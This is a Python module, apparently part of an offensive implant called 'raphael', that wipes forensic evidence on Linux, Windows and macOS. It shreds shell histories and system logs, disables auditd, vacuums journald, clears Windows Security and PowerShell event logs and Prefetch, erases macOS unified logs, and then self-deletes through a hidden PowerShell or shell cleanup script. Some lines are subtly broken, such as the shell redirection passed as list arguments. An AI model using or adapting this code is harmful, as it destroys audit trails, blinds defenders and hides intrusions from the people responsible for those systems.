import os
import platform
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import logging
from pathlib import Path

logger = logging.getLogger("raphael.cleanup")


def wipe_system_logs() -> dict:
    """
    Wipe forensic traces from system logs and shell histories.
    
    Returns dict with wipe statistics.
    """
    system = platform.system()
    
    if system == "Linux":
        return _wipe_linux_logs()
    elif system == "Windows":
        return _wipe_windows_logs()
    elif system == "Darwin":
        return _wipe_macos_logs()
    
    return {"wiped": 0, "failed": 0, "details": []}


def _wipe_linux_logs() -> dict:
    """Wipe Linux system logs and shell histories."""
    results = {"wiped": 0, "failed": 0, "details": []}
    home = os.path.expanduser("~")
    
    # Shell histories
    for hist_file in [".bash_history", ".zsh_history", ".python_history",
                      ".mysql_history", ".psql_history", ".node_repl_history"]:
        path = Path(home) / hist_file
        if path.exists():
            try:
                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
                results["wiped"] += 1
                results["details"].append(f"shred {path}")
            except Exception:
                results["failed"] += 1
    
    # Root shell history
    for root_hist in ["/root/.bash_history", "/root/.zsh_history"]:
        path = Path(root_hist)
        if path.exists():
            try:
                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
                results["wiped"] += 1
                results["details"].append(f"shred {path}")
            except Exception:
                results["failed"] += 1
    
    # System logs (requires root)
    if os.geteuid() == 0:
        syslog_files = [
            "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
            "/var/log/kern.log", "/var/log/dmesg", "/var/log/btmp",
            "/var/log/wtmp", "/var/log/lastlog", "/var/log/faillog",
            "/var/log/maillog", "/var/log/cron", "/var/log/secure",
        ]
        for logfile in syslog_files:
            path = Path(logfile)
            if path.exists():
                try:
                    subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=10)
                    results["wiped"] += 1
                    results["details"].append(f"shred {path}")
                except Exception:
                    results["failed"] += 1
        
        # Journald
        try:
            subprocess.run(["journalctl", "--rotate"], capture_output=True, timeout=5)
            subprocess.run(["journalctl", "--vacuum-time=1s"], capture_output=True, timeout=5)
            results["wiped"] += 1
            results["details"].append("journald vacuum")
        except Exception:
            results["failed"] += 1
        
        # Auditd
        try:
            subprocess.run(["auditctl", "-e", "0"], capture_output=True, timeout=5)
            audit_log = Path("/var/log/audit/audit.log")
            if audit_log.exists():
                subprocess.run(["shred", "-zu", str(audit_log)], capture_output=True, timeout=10)
                results["wiped"] += 1
                results["details"].append("auditd disabled + log shred")
        except Exception:
            results["failed"] += 1
    
    # Clear in-memory bash history
    if shutil.which("history"):
        try:
            subprocess.run(["history", "-c"], shell=True, capture_output=True)
            subprocess.run(["cat", "/dev/null", ">", os.path.join(home, ".bash_history")], 
                          shell=True, capture_output=True)
        except Exception:
            pass
    
    return results


def _wipe_windows_logs() -> dict:
    """Wipe Windows Event Logs."""
    results = {"wiped": 0, "failed": 0, "details": []}
    
    log_names = [
        "Security", "System", "Application",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-WinRM/Operational",
        "Microsoft-Windows-SMBClient/Connectivity",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Windows PowerShell",
        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    ]
    
    if not shutil.which("wevtutil.exe"):
        results["failed"] += len(log_names)
        return results
    for log_name in log_names:
        try:
            subprocess.run(
                ["wevtutil.exe", "cl", log_name],
                capture_output=True, timeout=10
            )
            results["wiped"] += 1
            results["details"].append(f"wevtutil cl {log_name}")
        except Exception:
            results["failed"] += 1
    
    # Prefetch
    prefetch_dir = Path(os.path.expandvars(r"%SystemRoot%\Prefetch"))
    if prefetch_dir.exists():
        for pf in prefetch_dir.glob("*.pf"):
            try:
                pf.unlink()
                results["wiped"] += 1
                results["details"].append(f"del prefetch {pf.name}")
            except Exception:
                results["failed"] += 1
    
    # RecentDocs
    if shutil.which("reg"):
        try:
            subprocess.run(
                ["reg", "delete", 
                 r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs", "/f"],
                capture_output=True, timeout=5
            )
            results["wiped"] += 1
            results["details"].append("RecentDocs cleared")
        except Exception:
            results["failed"] += 1
    
    return results


def _wipe_macos_logs() -> dict:
    """Wipe macOS logs."""
    results = {"wiped": 0, "failed": 0, "details": []}
    
    home = os.path.expanduser("~")
    for hist in [".bash_history", ".zsh_history", ".python_history"]:
        path = Path(home) / hist
        if path.exists():
            try:
                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
                results["wiped"] += 1
                results["details"].append(f"shred {path}")
            except Exception:
                results["failed"] += 1
    
    # Unified logs (requires SIP disabled or root)
    if os.geteuid() == 0 and shutil.which("log"):
        try:
            subprocess.run(["log", "erase", "--all"], capture_output=True, timeout=10)
            results["wiped"] += 1
            results["details"].append("log erase --all")
        except Exception:
            results["failed"] += 1
    
    return results


def self_delete(agent_dir: str | Path, secure: bool = True, wipe_logs: bool = False) -> None:
    """
    Remove the agent directory tree with proper race-condition handling.

    Strategy:
    1. Delete the current script file first (process holds inode, file disappears
       from directory listing but process continues)
    2. Delete all files in agent_dir bottom-up
    3. Delete the agent_dir itself
    4. Spawn a detached cleanup process that self-destructs

    On Linux:       Works reliably using inode-based deletion
    On macOS:       Same as Linux
    On Windows:     Uses delayed deletion via FILE_FLAG_DELETE_ON_CLOSE
    """
    agent_dir = Path(agent_dir).resolve()
    if not agent_dir.exists():
        logger.warning("Agent directory %s does not exist. Nothing to delete.", agent_dir)
        return

    current_script = Path(sys.argv[0]).resolve()

    # ── Step 1: Delete the running script ──────────────────────────────────────
    # The process holds the file's inode open, so the file is removed from the
    # directory listing immediately. The process continues running normally.
    if current_script.exists():
        _force_delete(current_script)
        logger.info("Deleted running script: %s", current_script)

    # ── Step 2: Delete all other files bottom-up ───────────────────────────────
    _rmtree_bottom_up(agent_dir)

    # ── Step 3: Handle deletion of current process directory ───────────────────
    # After rmtree, the agent_dir no longer exists in the filesystem.
    # The process's CWD may still reference it, so change CWD to /tmp first.
    try:
        os.chdir(tempfile.gettempdir())
    except OSError:
        pass

    # ── Step 4: Spawn cleanup process for Windows ──────────────────────────────
    if platform.system() == "Windows":
        _windows_cleanup_process(agent_dir)
    else:
        _unix_cleanup_process(agent_dir)

    logger.info("Self-delete complete. Agent directory removed.")


def _force_delete(path: Path) -> None:
    """Delete a file, removing read-only attributes if necessary."""
    try:
        path.chmod(stat.S_IWUSR | stat.S_IRUSR)
        path.unlink()
    except PermissionError:
        # On Windows, files may be read-only
        if platform.system() == "Windows" and shutil.which("cmd"):
            subprocess.run(
                ["cmd", "/c", "del", "/f", "/q", str(path)],
                capture_output=True,
            )
    except FileNotFoundError:
        pass  # Already deleted


def _rmtree_bottom_up(root: Path) -> None:
    """
    Delete a directory tree bottom-up to minimize race windows.

    Normal shutil.rmtree walks top-down. If interrupted mid-way, the top
    directories are gone but leaf files remain — making recovery harder.
    Bottom-up ensures leaf files are deleted first, then directories.
    """
    if not root.exists():
        return

    # Collect all paths sorted by depth (deepest first)
    all_paths: list[Path] = []
    for path in root.rglob("*"):
        all_paths.append(path)

    # Sort by depth descending (deepest first)
    all_paths.sort(key=lambda p: len(p.parents), reverse=True)

    for path in all_paths:
        try:
            if path.is_file() or path.is_symlink():
                _force_delete(path)
            elif path.is_dir():
                try:
                    path.rmdir()  # Only removes if empty
                except OSError:
                    # Directory not empty — force delete contents
                    shutil.rmtree(path, onerror=_handle_remove_error)
        except FileNotFoundError:
            continue  # Race: another process deleted it
        except PermissionError:
            logger.warning("Cannot delete %s (permission denied)", path)

    # Final attempt on root
    if root.exists():
        try:
            root.rmdir()
        except OSError:
            shutil.rmtree(root, onerror=_handle_remove_error)


def _handle_remove_error(func, path, exc_info) -> None:
    """
    Error handler for shutil.rmtree. Retries after changing permissions.
    """
    try:
        os.chmod(path, stat.S_IWUSR | stat.S_IRUSR | stat.S_IXUSR)
        func(path)
    except (PermissionError, OSError):
        logger.warning("Could not delete %s even after chmod", path)


def _unix_cleanup_process(agent_dir: Path) -> None:
    """
    On Unix: exec a tiny shell script that sleeps, then deletes any remaining
    artifacts. The exec replaces the current process, so no zombie is left.
    """
    cleanup_script = (
        "#!/bin/sh\n"
        "sleep 2\n"
        f"rm -rf '{agent_dir}' 2>/dev/null\n"
        # Self-delete: overwrite the cleanup script with random data,
        # then delete it
        "dd if=/dev/urandom of=\"$0\" bs=1024 count=1 2>/dev/null\n"
        "rm -f \"$0\"\n"
    )

    # Write cleanup script to /tmp
    script_path = Path(tempfile.gettempdir()) / f".raphael_cleanup_{os.urandom(4).hex()}.sh"
    script_path.write_text(cleanup_script)
    script_path.chmod(0o700)

    # Exec the cleanup script — replaces current process
    # After this line, the Python process no longer exists
    os.execle("/bin/sh", "sh", str(script_path), os.environ)


def _windows_cleanup_process(agent_dir: Path) -> None:
    """
    On Windows: use a PowerShell script that waits for the process to exit,
    then deletes all remaining files.

    Windows has a different approach: we use a detached PowerShell process
    that waits and then deletes.
    """
    ps_script = f"""
    Start-Sleep -Seconds 3
    Remove-Item -Path '{agent_dir}' -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path '$PSCommandPath' -Force -ErrorAction SilentlyContinue
    """

    # Write script to temp
    script_path = Path(tempfile.gettempdir()) / f"raphael_cleanup_{os.urandom(4).hex()}.ps1"
    script_path.write_text(ps_script)

    # Launch hidden, detached PowerShell process
    if not shutil.which("powershell.exe"):
        logger.warning("powershell.exe not found, cannot launch cleanup process")
        return
    subprocess.Popen(
        [
            "powershell.exe",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-File", str(script_path),
        ],
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        close_fds=True,
    )

    # Exit current process
    os._exit(0)